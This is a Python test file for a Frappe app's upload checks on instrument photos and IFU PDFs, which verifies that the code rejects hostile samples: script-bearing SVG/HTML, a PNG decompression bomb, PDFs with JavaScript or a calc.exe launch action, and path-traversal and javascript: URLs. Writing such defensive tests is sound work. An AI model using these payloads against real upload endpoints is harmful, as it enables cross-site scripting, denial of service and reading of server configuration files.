"""Ảnh thực tế, IFU và thumbnail của dụng cụ (FEAT-014 Task 3, FR-M1-01.5/.6, A-06 I11, Review Focus 2)."""

import io
import os
import struct
import zlib
from unittest.mock import patch

import frappe
from frappe.core.doctype.file.file import File
from frappe.tests.utils import FrappeTestCase
from PIL import Image

from tracecore.instrument import bom, media
from tracecore.tests.factories import attach_instrument_file, make_bom, make_instrument, make_set_type

# Instrument liên kết Item (ERPNext) và User (owner): site CI chưa chạy Setup Wizard
test_ignore = ["Item", "User", "Batch"]

RED, BLUE, GREEN = (220, 20, 20), (20, 20, 220), (20, 180, 20)


def _image(fmt="JPEG", size=(64, 48), color=RED):
	buffer = io.BytesIO()
	Image.new("RGB", size, color).save(buffer, format=fmt)
	return buffer.getvalue()


def _split_jpeg(size=(400, 200), orientation=6):
	"""JPEG nửa trái đỏ, nửa phải xanh dương, có EXIF Orientation (6 = hiển thị xoay 90° theo chiều kim đồng hồ)."""
	width, height = size
	image = Image.new("RGB", size, BLUE)
	image.paste(Image.new("RGB", (width // 2, height), RED), (0, 0))
	exif = Image.Exif()
	exif[0x0112] = orientation
	buffer = io.BytesIO()
	image.save(buffer, format="JPEG", quality=95, exif=exif.tobytes())
	return buffer.getvalue()


def _png_header_only(width, height):
	"""PNG có IHDR khai kích thước lớn nhưng không có dữ liệu ảnh: mẫu "bom giải nén" (file nhỏ, ảnh khổng lồ)."""

	def chunk(kind, data):
		return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))

	ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
	return (
		b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", zlib.compress(b"")) + chunk(b"IEND", b"")
	)


PDF_JS_CATALOG = b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>"


def _pdf_build(padding, catalog=b"<< /Type /Catalog /Pages 2 0 R >>"):
	objects = (
		catalog,
		b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
		b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>",
	)
	body = b"%PDF-1.4\n"
	offsets = []
	for number, obj in enumerate(objects, 1):
		offsets.append(len(body))
		body += b"%d 0 obj\n" % number + obj + b"\nendobj\n"
	# dòng chú thích PDF ("%...") để đủ kích thước mong muốn
	line = b"%" + b"x" * 1022 + b"\n"
	full, rest = divmod(max(padding, 0), len(line))
	body += line * full + (b"%" + b"x" * (rest - 2) + b"\n" if rest >= 2 else b"\n" * rest)
	xref = len(body)
	tail = b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
	tail += b"".join(b"%010d 00000 n \n" % offset for offset in offsets)
	tail += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref)
	return body + tail


def _pdf(total_size=None):
	"""PDF một trang hợp lệ; có `total_size` thì đúng chừng ấy byte."""
	padding = 0
	content = _pdf_build(padding)
	while total_size is not None and len(content) != total_size:
		padding += total_size - len(content)
		content = _pdf_build(padding)
	return content


def _pdf_objstm(catalog):
	"""PDF 1.5 có catalog (đối tượng 4) nằm trong object stream (đối tượng 3), bảng xref dạng stream (đối tượng 5)."""
	pages = b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>"
	page = b"<< /Type /Page /Parent 1 0 R /MediaBox [0 0 200 200] >>"
	header = b"4 0 "
	stream = header + catalog
	body = b"%PDF-1.5\n"
	offsets = {}
	for number, obj in ((1, pages), (2, page)):
		offsets[number] = len(body)
		body += b"%d 0 obj\n" % number + obj + b"\nendobj\n"
	offsets[3] = len(body)
	body += (
		b"3 0 obj\n<< /Type /ObjStm /N 1 /First %d /Length %d >>\nstream\n" % (len(header), len(stream))
		+ stream
		+ b"\nendstream\nendobj\n"
	)
	offsets[5] = len(body)

	def used(number):
		return b"\x01" + offsets[number].to_bytes(4, "big") + b"\x00\x00"

	rows = (
		b"\x00" + b"\x00" * 4 + b"\xff\xff",
		used(1),
		used(2),
		used(3),
		b"\x02" + (3).to_bytes(4, "big") + b"\x00\x00",
		used(5),
	)
	data = b"".join(rows)
	body += (
		b"5 0 obj\n<< /Type /XRef /Size 6 /W [1 4 2] /Root 4 0 R /Length %d >>\nstream\n" % len(data)
		+ data
		+ b"\nendstream\nendobj\n"
	)
	return body + b"startxref\n%d\n%%%%EOF\n" % offsets[5]


def _catalog(extra):
	return b"<< /Type /Catalog /Pages 2 0 R " + extra + b" >>"


def _loose_file(content, file_name, is_private=1):
	"""File chưa đính vào bản ghi nào (đính kèm rời): hook kiểm ảnh/IFU chưa chạy cho file này."""
	return frappe.get_doc(
		{"doctype": "File", "file_name": file_name, "content": content, "is_private": is_private}
	).insert()


ATTACH_IFU = {"attached_to_doctype": "Instrument", "attached_to_field": "ifu"}
ATTACH_IMAGE = {"attached_to_doctype": "Instrument", "attached_to_field": "image"}


def _file_doc(instrument, field, content, file_name, is_private=1):
	return frappe.get_doc(
		{
			"doctype": "File",
			"file_name": file_name,
			"content": content,
			"is_private": is_private,
			"attached_to_doctype": "Instrument",
			"attached_to_name": instrument,
			"attached_to_field": field,
		}
	)


def _set_media(code, **values):
	doc = frappe.get_doc("Instrument", code)
	doc.update(values)
	doc.save()
	return doc


class TestInstrumentMedia(FrappeTestCase):
	def assertRejected(
		self, instrument, field, content, file_name, *fragments, error=frappe.ValidationError, shared=False
	):
		"""Tải lên bị từ chối, không tạo bản ghi File và không để lại blob trên đĩa.

		`shared`: blob là của bản ghi File khác (Frappe dùng lại theo content_hash) nên phải còn nguyên.
		"""
		before = frappe.db.count("File", {"attached_to_name": instrument})
		file_doc = _file_doc(instrument, field, content, file_name)
		with self.assertRaises(error) as raised:
			file_doc.insert()
		for fragment in fragments:
			self.assertIn(fragment, str(raised.exception))
		if shared:
			self.assertTrue(os.path.exists(file_doc.get_full_path()), msg=file_doc.file_url)
		elif file_doc.file_url:
			self.assertFalse(os.path.exists(file_doc.get_full_path()), msg=file_doc.file_url)
		self.assertEqual(frappe.db.count("File", {"attached_to_name": instrument}), before)
		return file_doc

	def test_sniff_reads_magic_bytes(self):
		self.assertEqual(media.sniff(_pdf()), "pdf")
		self.assertEqual(media.sniff(_image("JPEG")), "jpeg")
		self.assertEqual(media.sniff(_image("PNG")), "png")
		self.assertEqual(media.sniff(_image("WEBP")), "webp")
		for content in (
			b"",
			b"<html><body>manual</body></html>",
			b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
			b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 56,
			b"\x00\x00\x00\x18ftypheic\x00\x00\x00\x00mif1heic",
			b"RIFF\x10\x00\x00\x00WAVEfmt ",
		):
			self.assertIsNone(media.sniff(content), msg=content[:16])
		self.assertEqual(
			(media.IFU_MAX_BYTES, media.IMAGE_MAX_BYTES, media.IMAGE_MAX_PIXELS, media.THUMB_MAX_SIDE),
			(20 * 1024 * 1024, 5 * 1024 * 1024, 40_000_000, 320),
		)

	def test_ifu_over_20mb_rejected_and_blob_removed(self):
		# FR-M1-01.5, Review Focus 2: 20 MiB + 1 byte bị từ chối, nêu giới hạn; không còn blob kể cả sau rollback
		make_instrument("MD-IFU-BIG")
		content = _pdf(media.IFU_MAX_BYTES + 1)
		self.assertEqual(len(content), 20 * 1024 * 1024 + 1)
		rejected = self.assertRejected("MD-IFU-BIG", "ifu", content, "ifu-big.pdf", "20 MB")
		path = rejected.get_full_path()
		frappe.db.rollback()
		self.assertFalse(os.path.exists(path))
		self.assertFalse(frappe.db.exists("File", {"file_url": rejected.file_url}))

		# đúng 20 MiB: nhận, file riêng tư, gán được vào trường IFU
		make_instrument("MD-IFU-MAX")
		exact = _pdf(media.IFU_MAX_BYTES)
		self.assertEqual(len(exact), media.IFU_MAX_BYTES)
		file_doc = attach_instrument_file("MD-IFU-MAX", "ifu", exact, "ifu-max.pdf")
		self.assertEqual(file_doc.is_private, 1)
		self.assertTrue(os.path.exists(file_doc.get_full_path()))
		doc = _set_media("MD-IFU-MAX", ifu=file_doc.file_url)
		self.assertEqual(doc.ifu, file_doc.file_url)

	def test_instrument_saves_without_ifu_after_rejection(self):
		# UC-01 E2: IFU bị từ chối thì dụng cụ vẫn lưu được, không kèm IFU
		make_instrument("MD-NOIFU")
		self.assertRejected("MD-NOIFU", "ifu", _pdf(media.IFU_MAX_BYTES + 4096), "too-big.pdf", "20 MB")
		doc = _set_media("MD-NOIFU", manufacturer="Aesculap")
		self.assertEqual(doc.manufacturer, "Aesculap")
		self.assertFalse(doc.ifu)
		fresh = frappe.get_doc(
			{
				"doctype": "Instrument",
				"instrument_code": "MD-NOIFU-2",
				"instrument_name": "Kéo",
				"spaulding_class": "Critical",
				"compatible_methods": [{"method": "Steam 134"}],
			}
		).insert()
		self.assertFalse(fresh.ifu)

	def test_upload_type_sniffed_not_trusted(self):
		make_instrument("MD-SNIFF")
		html = b"<!DOCTYPE html><html><body><script>alert(1)</script></body></html>"
		svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>'
		exe = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x00" * 64 + b"This program"
		heic = b"\x00\x00\x00\x18ftypheic\x00\x00\x00\x00mif1heic" + b"\x00" * 64
		# đuôi .pdf / .jpg: Frappe đọc nội dung trước khi ghi đĩa (pypdf, bỏ EXIF) nên media.precheck_upload kiểm
		# trước (lớp File của TraceCore); đuôi khác: hook media.check_upload đọc magic bytes. Cả hai từ chối có hướng dẫn
		self.assertRejected("MD-SNIFF", "ifu", html, "manual.pdf", "PDF")
		self.assertRejected("MD-SNIFF", "ifu", html, "manual.txt", "PDF")
		self.assertRejected("MD-SNIFF", "ifu", exe, "manual.png", "PDF")
		self.assertRejected("MD-SNIFF", "image", svg, "photo.jpg", "JPEG")
		self.assertRejected("MD-SNIFF", "image", svg, "photo.jpeg", "JPEG")
		self.assertRejected("MD-SNIFF", "ifu", svg, "manual.jpg", "PDF")
		self.assertRejected("MD-SNIFF", "image", svg, "photo.webp", "JPEG")
		self.assertRejected("MD-SNIFF", "image", exe, "photo.png", "JPEG")
		self.assertRejected("MD-SNIFF", "image", heic, "photo.heic", "HEIC")
		self.assertRejected("MD-SNIFF", "image", _pdf(), "photo.png", "JPEG")
		# ảnh hỏng: đúng magic bytes nhưng không giải mã được
		self.assertRejected("MD-SNIFF", "image", b"\x89PNG\r\n\x1a\n" + b"\x00" * 40, "broken.png")
		# JPEG thật nhưng đổi đuôi .png: nhận theo nội dung
		accepted = attach_instrument_file("MD-SNIFF", "image", _image("JPEG"), "renamed.png")
		self.assertEqual(accepted.is_private, 1)
		self.assertEqual(media.sniff(open(accepted.get_full_path(), "rb").read()), "jpeg")
		# ảnh JPEG/PNG cũng nhận được làm IFU
		self.assertTrue(attach_instrument_file("MD-SNIFF", "ifu", _image("PNG"), "ifu-scan.png").file_url)

	def test_fake_jpg_and_pdf_via_upload_handler_rejected_cleanly(self):
		# Desk tải lên qua frappe.handler.upload_file: SVG đổi đuôi .jpg / HTML đổi đuôi .pdf trước đây ra HTTP 500
		# (Frappe bỏ EXIF / đọc PDF trước hook). Nay: ValidationError (HTTP 417) có thông báo dịch, không File, không blob
		from frappe import handler
		from werkzeug.datastructures import FileStorage

		make_instrument("MD-HANDLER")
		svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>'
		html = b"<!DOCTYPE html><html><body>not a pdf</body></html>"
		private_dir = frappe.get_site_path("private", "files")
		public_dir = frappe.get_site_path("public", "files")

		def upload(field, content, file_name, optimize=0, is_private=1):
			storage = FileStorage(stream=io.BytesIO(content), filename=file_name)
			request = type("Request", (), {"files": {"file": storage}})()
			frappe.local.form_dict = frappe._dict(
				doctype="Instrument",
				docname="MD-HANDLER",
				fieldname=field,
				is_private=is_private,
				optimize=optimize,
			)
			try:
				with patch.object(frappe, "request", request, create=True):
					return handler.upload_file()
			finally:
				frappe.local.form_dict = frappe._dict()

		for field, content, file_name, optimize, fragment in (
			("image", svg, "photo.jpg", 1, "JPEG"),
			("image", svg, "photo.jpg", 0, "JPEG"),
			("ifu", html, "manual.pdf", 0, "PDF"),
			("ifu", svg, "scan.jpg", 0, "PDF"),
		):
			with self.subTest(file_name=file_name, optimize=optimize):
				before = (set(os.listdir(private_dir)), set(os.listdir(public_dir)))
				count = frappe.db.count("File", {"attached_to_name": "MD-HANDLER"})
				with self.assertRaises(frappe.ValidationError) as raised:
					upload(field, content, file_name, optimize)
				self.assertIn(fragment, str(raised.exception))
				self.assertEqual(frappe.db.count("File", {"attached_to_name": "MD-HANDLER"}), count)
				self.assertEqual((set(os.listdir(private_dir)), set(os.listdir(public_dir))), before)
		frappe.clear_messages()
		# ảnh JPEG thật qua cùng đường: vẫn nhận, luôn riêng tư
		saved = upload("image", _image("JPEG", color=(9, 99, 199)), "real.jpg", is_private=0)
		self.assertEqual(saved.is_private, 1)
		self.assertEqual(media.sniff(open(saved.get_full_path(), "rb").read()), "jpeg")

	def test_precheck_reads_base64_content_without_breaking_save(self):
		# content base64 (decode=True, như frappe.client.attach_file): kiểm trước trên nội dung đã giải mã, rồi Frappe
		# vẫn ghi đúng bytes ảnh
		import base64

		make_instrument("MD-B64")
		good = _file_doc(
			"MD-B64", "image", base64.b64encode(_image("JPEG", color=(7, 77, 177))).decode(), "b64.jpg"
		)
		good.decode = True
		good.insert()
		self.assertEqual(media.sniff(open(good.get_full_path(), "rb").read()), "jpeg")
		svg = b'<svg xmlns="http://www.w3.org/2000/svg"></svg>'
		bad = _file_doc("MD-B64", "image", base64.b64encode(svg).decode(), "b64-bad.jpg")
		bad.decode = True
		with self.assertRaises(frappe.ValidationError) as raised:
			bad.insert()
		self.assertIn("JPEG", str(raised.exception))
		self.assertIsInstance(frappe.get_doc({"doctype": "File"}), media.InstrumentMediaFile)
		# base64 hỏng → "file hỏng"; nội dung dạng chuỗi (SVG text) đổi đuôi .jpg → từ chối, không 500
		broken = _file_doc("MD-B64", "image", "abc", "b64-broken.jpg")
		broken.decode = True
		with patch.object(media, "decode_file_content", side_effect=ValueError("bad base64")):
			with self.assertRaises(frappe.ValidationError) as raised:
				broken.insert()
		self.assertIn(media._unreadable_message(), str(raised.exception))
		text = _file_doc("MD-B64", "image", svg.decode(), "text.jpg")
		with self.assertRaises(frappe.ValidationError) as raised:
			text.insert()
		self.assertIn("JPEG", str(raised.exception))

	def test_image_limits(self):
		make_instrument("MD-LIMIT")
		# 5 MiB + 1 byte: JPEG thật kèm dữ liệu thừa sau EOI
		big = _image("JPEG", size=(32, 32))
		big += b"\x00" * (media.IMAGE_MAX_BYTES + 1 - len(big))
		self.assertEqual(len(big), media.IMAGE_MAX_BYTES + 1)
		self.assertRejected("MD-LIMIT", "image", big, "big.png", "5 MB")
		# 9000 x 9000 = 81 megapixel > 40: từ chối dù file nhỏ
		huge = io.BytesIO()
		Image.new("1", (9000, 9000), 1).save(huge, format="PNG")
		self.assertLess(len(huge.getvalue()), media.IMAGE_MAX_BYTES)
		self.assertRejected("MD-LIMIT", "image", huge.getvalue(), "huge.png", "40")
		# bom giải nén: khai 50000 x 50000 (vượt cả ngưỡng DecompressionBomb của Pillow)
		self.assertRejected("MD-LIMIT", "image", _png_header_only(50000, 50000), "bomb.png", "40")
		self.assertRejected("MD-LIMIT", "ifu", _png_header_only(50000, 50000), "bomb-ifu.png", "40")
		# ảnh hợp lệ yêu cầu công khai: vẫn lưu riêng tư, không để lại bản công khai
		public = _file_doc("MD-LIMIT", "image", _image("PNG", color=GREEN), "public.png", is_private=0)
		public.insert()
		self.assertEqual(public.is_private, 1)
		self.assertTrue(public.file_url.startswith("/private/files/"), msg=public.file_url)
		self.assertTrue(os.path.exists(public.get_full_path()))
		self.assertFalse(
			os.path.exists(frappe.get_site_path("public", "files", os.path.basename(public.file_url)))
		)
		self.assertEqual(frappe.db.get_value("File", public.name, "is_private"), 1)

	def test_file_cannot_be_made_public_later(self):
		make_instrument("MD-KEEP")
		file_doc = attach_instrument_file("MD-KEEP", "image", _image("PNG"), "keep.png")
		file_doc.is_private = 0
		with self.assertRaises(frappe.ValidationError):
			file_doc.save()
		self.assertEqual(frappe.db.get_value("File", file_doc.name, "is_private"), 1)

	def test_pdf_scripts_rejected_and_shared_blob_kept(self):
		make_instrument("MD-SHARE")
		# PDF có JavaScript ở /OpenAction của catalog (gián tiếp: kiểm của Frappe bỏ lọt), đuôi nào cũng bị chặn
		self.assertRejected("MD-SHARE", "ifu", _pdf_build(0, PDF_JS_CATALOG), "manual.pdf", "script")
		self.assertRejected("MD-SHARE", "ifu", _pdf_build(0, PDF_JS_CATALOG), "manual.bin", "script")
		launch = b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /Launch /F (calc.exe) >> >>"
		self.assertRejected("MD-SHARE", "ifu", _pdf_build(0, launch), "launch.pdf", "script")
		self.assertFalse(media.pdf_has_active_content(_pdf()))
		with self.assertRaises(Exception):
			media.pdf_has_active_content(b"%PDF-1.4\n" + b"0" * 64)
		# blob Frappe dùng lại theo content_hash của bản ghi khác: từ chối không được xóa blob đó
		content = _image("PNG", color=BLUE)
		kept = attach_instrument_file("MD-SHARE", "image", content, "shared.png")
		rejected = self.assertRejected(
			"MD-SHARE", "image_thumbnail", content, "shared-again.png", shared=True
		)
		self.assertEqual(rejected.file_url, kept.file_url)
		self.assertTrue(os.path.exists(kept.get_full_path()))
		# File đính vào dụng cụ ngoài trường ảnh/IFU (đính kèm ở sidebar): không thuộc kiểm tra này
		sidebar = _file_doc("MD-SHARE", None, b"ghi chu", "note.txt").insert()
		self.assertTrue(sidebar.name)

	def test_transparent_photo_thumbnail_on_white(self):
		make_instrument("MD-ALPHA")
		buffer = io.BytesIO()
		Image.new("RGBA", (640, 640), (0, 0, 0, 0)).save(buffer, format="PNG")
		source = attach_instrument_file("MD-ALPHA", "image", buffer.getvalue(), "alpha.png")
		doc = _set_media("MD-ALPHA", image=source.file_url)
		thumb = Image.open(frappe.get_doc("File", {"file_url": doc.image_thumbnail}).get_full_path())
		self.assertEqual((thumb.format, thumb.mode, thumb.size), ("JPEG", "RGB", (320, 320)))
		self.assertGreater(min(thumb.getpixel((160, 160))), 240)  # nền trong suốt thành trắng
		with self.assertRaises(frappe.DoesNotExistError):
			media.image_info("MD-ALPHA-NONE")

	def test_remote_and_thumbnail_uploads_rejected(self):
		make_instrument("MD-REMOTE")
		remote = frappe.get_doc(
			{
				"doctype": "File",
				"file_url": "https://example.com/manual.pdf",
				"attached_to_doctype": "Instrument",
				"attached_to_name": "MD-REMOTE",
				"attached_to_field": "ifu",
			}
		)
		with self.assertRaises(frappe.ValidationError):
			remote.insert()
		# trường thumbnail chỉ server ghi
		self.assertRejected("MD-REMOTE", "image_thumbnail", _image("JPEG"), "thumb.jpg")
		# File đính vào DocType khác không bị đụng tới
		other = frappe.get_doc(
			{"doctype": "File", "file_name": "note.txt", "content": b"hello", "is_private": 1}
		).insert()
		self.assertTrue(other.name)

	def test_field_url_must_be_own_private_file(self):
		make_instrument("MD-URL")
		make_instrument("MD-URL-OTHER")
		foreign = attach_instrument_file("MD-URL-OTHER", "image", _image("PNG", color=BLUE), "foreign.png")
		unattached = frappe.get_doc(
			{
				"doctype": "File",
				"file_name": "loose.png",
				"content": _image("PNG", color=GREEN),
				"is_private": 0,
			}
		).insert()
		own_ifu = attach_instrument_file("MD-URL", "ifu", _pdf(), "own.pdf")
		for field, value in (
			("image", "http://evil.example/x.png"),
			("image", "https://evil.example/x.png"),
			("image", foreign.file_url),
			("image", unattached.file_url),
			("image", "/private/files/../../site_config.json"),
			("image", "/files/x.png"),
			("image", own_ifu.file_url),  # File của chính dụng cụ nhưng thuộc trường khác
			("ifu", "javascript:alert(1)"),
		):
			with self.subTest(field=field, value=value):
				doc = frappe.get_doc("Instrument", "MD-URL")
				doc.set(field, value)
				with self.assertRaises(frappe.ValidationError):
					doc.save()
		own = attach_instrument_file("MD-URL", "image", _image("PNG"), "own.png")
		doc = _set_media("MD-URL", image=own.file_url, ifu=own_ifu.file_url)
		self.assertEqual((doc.image, doc.ifu), (own.file_url, own_ifu.file_url))

	def test_new_instrument_accepts_file_uploaded_before_first_save(self):
		# Desk: tải ảnh lên khi dụng cụ chưa lưu (File đính vào tên tạm), Frappe đổi liên kết sau khi insert
		file_doc = attach_instrument_file("new-instrument-md1", "image", _image("PNG"), "draft.png")
		doc = frappe.get_doc(
			{
				"doctype": "Instrument",
				"instrument_code": "MD-DRAFT",
				"instrument_name": "Kẹp",
				"spaulding_class": "Critical",
				"compatible_methods": [{"method": "Steam 134"}],
				"image": file_doc.file_url,
			}
		)
		doc.set("__temporary_name", "new-instrument-md1")
		doc.insert()
		self.assertEqual(frappe.db.get_value("File", file_doc.name, "attached_to_name"), "MD-DRAFT")
		self.assertTrue(doc.image_thumbnail)

	def test_thumbnail_generated_upright_without_exif(self):
		make_instrument("MD-THUMB")
		# đuôi .png: Frappe không bỏ EXIF của file này, thumbnail phải tự xoay theo EXIF
		source = attach_instrument_file("MD-THUMB", "image", _split_jpeg(), "portrait.png")
		self.assertEqual(Image.open(source.get_full_path()).getexif().get(0x0112), 6)
		doc = _set_media("MD-THUMB", image=source.file_url)
		self.assertTrue(doc.image_thumbnail.startswith("/private/files/"), msg=doc.image_thumbnail)
		thumb_file = frappe.get_doc("File", {"file_url": doc.image_thumbnail, "attached_to_name": "MD-THUMB"})
		self.assertEqual((thumb_file.attached_to_field, thumb_file.is_private), ("image_thumbnail", 1))
		thumb = Image.open(thumb_file.get_full_path())
		self.assertEqual(thumb.format, "JPEG")
		self.assertEqual(thumb.size, (160, 320))  # dọc, cạnh dài 320
		self.assertFalse(dict(thumb.getexif()))
		self.assertNotIn("exif", thumb.info)
		rgb = thumb.convert("RGB")
		top, bottom = rgb.getpixel((80, 40)), rgb.getpixel((80, 280))
		self.assertGreater(top[0], top[2], msg=top)  # nửa trái (đỏ) lên trên sau khi xoay
		self.assertGreater(bottom[2], bottom[0], msg=bottom)
		first = media.image_info("MD-THUMB")
		self.assertEqual(first["etag"], thumb_file.content_hash)

		# lưu lại không đổi ảnh: giữ thumbnail
		self.assertEqual(_set_media("MD-THUMB", model="BH110").image_thumbnail, doc.image_thumbnail)
		# đổi ảnh: thumbnail và etag mới
		other = attach_instrument_file(
			"MD-THUMB", "image", _image("WEBP", size=(800, 600), color=GREEN), "new.webp"
		)
		doc = _set_media("MD-THUMB", image=other.file_url)
		second = media.image_info("MD-THUMB")
		self.assertNotEqual(second["thumbnail_url"], first["thumbnail_url"])
		self.assertNotEqual(second["etag"], first["etag"])
		self.assertEqual(
			Image.open(frappe.get_doc("File", {"file_url": doc.image_thumbnail}).get_full_path()).size,
			(320, 240),
		)
		# xóa ảnh: bỏ liên kết thumbnail
		doc = _set_media("MD-THUMB", image=None)
		self.assertFalse(doc.image_thumbnail)
		self.assertEqual(
			media.image_info("MD-THUMB"),
			{
				"instrument": "MD-THUMB",
				"image_url": None,
				"thumbnail_url": None,
				"etag": None,
				"has_image": False,
			},
		)

	def test_thumbnail_field_not_editable_directly(self):
		# carry-over Task 1: image_thumbnail là trường dẫn xuất, lưu thường không đổi được
		make_instrument("MD-GUARD")
		source = attach_instrument_file("MD-GUARD", "image", _image("PNG"), "guard.png")
		doc = _set_media("MD-GUARD", image=source.file_url)
		forged = attach_instrument_file("MD-GUARD", "ifu", _image("PNG", color=BLUE), "forged.png")
		for value in (forged.file_url, None):
			with self.subTest(value=value):
				doc = frappe.get_doc("Instrument", "MD-GUARD")
				doc.image_thumbnail = value
				with self.assertRaises(frappe.ValidationError):
					doc.save()
		with self.assertRaises(frappe.ValidationError):
			frappe.get_doc(
				{
					"doctype": "Instrument",
					"instrument_code": "MD-GUARD-NEW",
					"instrument_name": "Kéo",
					"spaulding_class": "Critical",
					"compatible_methods": [{"method": "Steam 134"}],
					"image_thumbnail": forged.file_url,
				}
			).insert()

	def test_bom_lines_include_thumbnail(self):
		# FR-M1-01.6: trạm dùng thumbnail, không tải ảnh gốc
		st = make_set_type("MDB")
		make_instrument("MD-BOM-A", name="Kẹp có ảnh")
		source = attach_instrument_file("MD-BOM-A", "image", _image("PNG"), "bom-a.png")
		with_photo = _set_media("MD-BOM-A", image=source.file_url)
		make_bom(st.name, [("MD-BOM-A", 2), ("MD-BOM-B", 1)])
		rows = bom.lines(st.name, 1)
		self.assertEqual(
			set(rows[0]),
			{"instrument", "instrument_name", "image", "thumbnail", "qty", "position"},
			msg=rows[0],
		)
		self.assertEqual(
			(rows[0]["image"], rows[0]["thumbnail"]), (with_photo.image, with_photo.image_thumbnail)
		)
		self.assertTrue(rows[0]["thumbnail"])
		self.assertIsNone(rows[1]["thumbnail"])

	# --- fix wave Task 3: đính lại File có sẵn, PDF chủ động, chế độ ảnh, thumbnail mồ côi, file công khai cũ ---

	def assertReattachRejected(self, loose, values, *fragments):
		"""Đính lại File có sẵn vào trường ảnh/IFU bị từ chối; File và blob giữ nguyên như trước."""
		with self.assertRaises(frappe.ValidationError) as raised:
			frappe.client.set_value("File", loose.name, values)
		for fragment in fragments:
			self.assertIn(fragment, str(raised.exception))
		row = frappe.db.get_value(
			"File", loose.name, ["attached_to_doctype", "attached_to_field", "file_name"], as_dict=True
		)
		self.assertEqual((row.attached_to_doctype, row.attached_to_field), (None, None))
		self.assertEqual(row.file_name, loose.file_name)
		self.assertTrue(os.path.exists(loose.get_full_path()), msg=loose.file_url)

	def test_reattach_existing_file_checked_like_upload(self):
		# Review I1: File tải lên rời (chưa đính) rồi đính lại vào ifu/image phải qua đúng kiểm tra nội dung
		make_instrument("MD-REAT")
		html = _loose_file(b"<!DOCTYPE html><html><script>alert(1)</script></html>", "manual.txt")
		self.assertReattachRejected(
			html, {**ATTACH_IFU, "attached_to_name": "MD-REAT", "file_name": "x.pdf"}, "PDF"
		)
		big = _image("JPEG", size=(32, 32))
		big += b"\x00" * (media.IMAGE_MAX_BYTES + 1 - len(big))
		oversize = _loose_file(big, "big.png")
		self.assertReattachRejected(oversize, {**ATTACH_IMAGE, "attached_to_name": "MD-REAT"}, "5 MB")
		script_pdf = _loose_file(_pdf_build(2, PDF_JS_CATALOG), "manual.bin")
		self.assertReattachRejected(script_pdf, {**ATTACH_IFU, "attached_to_name": "MD-REAT"}, "script")
		thumb = _loose_file(_image("JPEG", color=(4, 44, 144)), "thumb.bin")
		self.assertReattachRejected(
			thumb, {**ATTACH_IMAGE, "attached_to_name": "MD-REAT", "attached_to_field": "image_thumbnail"}
		)
		# đổi từng trường một (đính vào dụng cụ trước, chọn trường sau) cũng bị kiểm
		doc = frappe.get_doc("File", html.name)
		doc.update({"attached_to_doctype": "Instrument", "attached_to_name": "MD-REAT"})
		doc.save()
		doc.attached_to_field = "ifu"
		with self.assertRaises(frappe.ValidationError):
			doc.save()
		self.assertIsNone(frappe.db.get_value("File", html.name, "attached_to_field"))
		# File đính vào trường ảnh đổi file_url sang blob khác cũng bị kiểm lại
		good = attach_instrument_file("MD-REAT", "image", _image("PNG", color=(9, 9, 9)), "good.png")
		doc = frappe.get_doc("File", good.name)
		doc.file_url = oversize.file_url
		with self.assertRaises(frappe.ValidationError):
			doc.save()
		self.assertEqual(frappe.db.get_value("File", good.name, "file_url"), good.file_url)

	def test_reattach_valid_file_still_accepted(self):
		# luồng hợp lệ: File rời đúng định dạng đính lại vào ảnh/IFU rồi gán vào dụng cụ được
		make_instrument("MD-REOK")
		photo = _loose_file(_image("PNG", color=(7, 70, 140)), "photo.png")
		frappe.client.set_value("File", photo.name, {**ATTACH_IMAGE, "attached_to_name": "MD-REOK"})
		manual = _loose_file(_pdf_build(4), "manual.pdf")
		frappe.client.set_value("File", manual.name, {**ATTACH_IFU, "attached_to_name": "MD-REOK"})
		doc = _set_media("MD-REOK", image=photo.file_url, ifu=manual.file_url)
		self.assertEqual((doc.image, doc.ifu), (photo.file_url, manual.file_url))
		self.assertTrue(doc.image_thumbnail)
		# File đã đính lưu lại không đổi gì: không bị kiểm lại, không lỗi
		frappe.get_doc("File", photo.name).save()

	def test_instrument_rechecks_content_of_new_url(self):
		# phòng thủ nhiều lớp: File bị gắn thẳng vào dụng cụ ở DB (bỏ qua hook File) vẫn bị Instrument.validate chặn
		make_instrument("MD-DEEP")
		cases = (
			("ifu", b"<html><script>alert(1)</script></html>", "x.txt", "PDF"),
			("ifu", _pdf_build(3, PDF_JS_CATALOG), "x.bin", "script"),
			("image", _pdf_build(3), "x.png", "JPEG"),
			("image", _png_header_only(50001, 50000), "bomb.png", "40"),
		)
		for field, content, file_name, fragment in cases:
			with self.subTest(field=field, file_name=file_name):
				loose = _loose_file(content, file_name)
				frappe.db.set_value(
					"File",
					loose.name,
					{
						"attached_to_doctype": "Instrument",
						"attached_to_name": "MD-DEEP",
						"attached_to_field": field,
					},
				)
				doc = frappe.get_doc("Instrument", "MD-DEEP")
				doc.set(field, loose.file_url)
				with self.assertRaises(frappe.ValidationError) as raised:
					doc.save()
				self.assertIn(fragment, str(raised.exception))
				self.assertFalse(frappe.db.get_value("Instrument", "MD-DEEP", field))

	def test_pdf_active_content_keys(self):
		# Review I2: ngoài JavaScript/Launch còn file nhúng, RichMedia, XFA, mở file khác, gửi/nhập dữ liệu biểu mẫu
		blocked = {
			"open action javascript": b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>",
			"embedded files": b"/Names << /EmbeddedFiles << /Names [(a.exe) << /Type /Filespec /F (a.exe) >>] >> >>",
			"embedded file stream type": b"/X << /Type /EmbeddedFile /Length 0 >>",
			"rich media": b"/X << /Type /Annot /Subtype /RichMedia >>",
